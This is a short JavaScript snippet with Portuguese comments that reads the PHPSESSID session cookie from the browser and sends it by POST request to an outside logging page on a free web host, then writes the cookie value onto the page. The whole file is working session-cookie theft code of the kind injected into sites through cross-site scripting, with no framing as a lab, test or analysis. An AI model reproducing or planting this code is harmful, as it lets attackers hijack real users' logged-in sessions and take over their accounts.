var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1");
fetch('https://projetoxd.000webhostapp.com/log.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'PHPSESSID=' + encodeURIComponent(cookieValue)
}).then(function(response) {
  // Lida com a resposta do servidor aqui
}).catch(function(error) {
  // Lida com erros de rede ou de servidor aqui
});
// Verifica se o cookie 'nomeDoCookie' estÃ¡ presente
if (document.cookie.indexOf("PHPSESSID") !== -1) {
  // Se estiver presente, obtÃ©m o valor do cookie
  var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1");
  // Apresenta o valor do cookie na tela
  document.write(cookieValue);
} else {
  // Se o cookie nÃ£o estiver presente, apresenta uma mensagem de erro na tela
  document.write(".");
}
